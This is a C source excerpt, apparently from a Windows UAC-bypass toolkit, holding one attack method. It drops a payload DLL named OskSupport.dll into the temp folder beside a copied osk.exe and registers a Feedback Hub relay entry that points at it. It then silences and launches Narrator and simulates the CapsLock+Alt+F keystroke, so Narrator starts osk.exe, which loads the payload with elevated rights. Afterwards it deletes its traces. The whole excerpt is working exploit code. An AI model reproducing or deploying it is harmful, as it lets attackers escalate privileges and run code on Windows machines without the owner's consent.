*/
NTSTATUS ucmNarratorMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL fRemoveFile = FALSE, fRemoveOsk = FALSE, fHubCreated = FALSE;
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HANDLE processHandle = NULL;
    WCHAR szOsk[MAX_PATH * 2];
    WCHAR szOskNew[MAX_PATH * 2];
    WCHAR szOskSupport[MAX_PATH * 2];
    WCHAR szBuffer[MAX_PATH * 2];
    UNICODE_STRING uStrProcessName = RTL_CONSTANT_STRING(OSK_EXE);

    do {
        //
        // Select payload entry point.
        //
        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            FUBUKI_ENTRYPOINT_R41N3RZUF477,
            FALSE))
        {
            break;
        }

        //
        // Drop Fubuki to the %temp% as OskSupport.dll
        //

        _strcpy(szOskSupport, g_ctx->szTempDirectory);
        supConcatenatePaths(szOskSupport, OSKSUPPORT_DLL, MAX_PATH);
        if (!supWriteBufferToFile(szOskSupport, ProxyDll, ProxyDllSize))
            break;

        fRemoveFile = TRUE;

        //
        // Copy Osk.exe to the %temp%
        //
        _strcpy(szOsk, g_ctx->szSystemDirectory);
        supConcatenatePaths(szOsk, OSK_EXE, MAX_PATH);
        _strcpy(szOskNew, g_ctx->szTempDirectory);
        supConcatenatePaths(szOskNew, OSK_EXE, MAX_PATH);
        if (!CopyFile(szOsk, szOskNew, FALSE))
            break;

        fRemoveOsk = TRUE;

        //
        // Create relay hub protocol entry with quoted payload.
        //
        _strcpy(szBuffer, TEXT("\""));
        _strcat(szBuffer, szOskNew);
        _strcat(szBuffer, TEXT("\""));
        if (!ucmxCreateRelayFeedBackHub(T_FEEDBACK_HUB_RELAY_NAME, szBuffer))
            break;

        fHubCreated = TRUE;

        //
        // Silence Narrator.
        //
        if (!ucmxSkipNarratorDialogs())
            break;

        //
        // Run Narrator.
        //
        processHandle = ucmxRunNarrator();
        if (processHandle == NULL)
            break;

        //
        // Make sure Narrator is initialized.
        //
        if (!ucmxWaitForNarrator(5000)) {
            TerminateProcess(processHandle, 0);
            CloseHandle(processHandle);
            processHandle = NULL;
            break;
        }

        //
        // Send input (CapsLock + LeftAlt + F) causing Narrator to execute 
        // feedback application (in our case Osk.exe) as second stager which 
        // will eventually run payload.
        //
        if (!ucmxPressFeedbackHubKeys()) {
            break;
        }

        MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    //
    // Its all about timing. However Windows 11 always have enough 
    // of flickering shit in the background (some shits spawning terminal 
    // windows and closing them imeditally are my favorites) so this is 
    // not a real issue for a demonstrator program.
    //

    //
    // Kill Narrator if exist.
    //
    if (processHandle) {
        ucmxKillNarrator(processHandle);
        CloseHandle(processHandle);
    }

    //
    // Kill Osk.exe if exist.
    //
    supEnumProcessesForSession(
        NtCurrentPeb()->SessionId,
        (pfnEnumProcessCallback)supTerminateProcessCallback,
        (PVOID)&uStrProcessName);

    supSetGlobalCompletionEvent();

    //
    // Cleanup section.
    //
    if (fHubCreated)
        ucmxRemoveFeedBackHub(T_FEEDBACK_HUB_RELAY_NAME);

    if (fRemoveFile)
        DeleteFile(szOskSupport);

    if (fRemoveOsk)
        DeleteFile(szOskNew);

    if (NT_SUCCESS(MethodResult))
        supRegDeleteKeyRecursive(HKEY_CURRENT_USER, T_NARRATOR);

    return MethodResult;
}
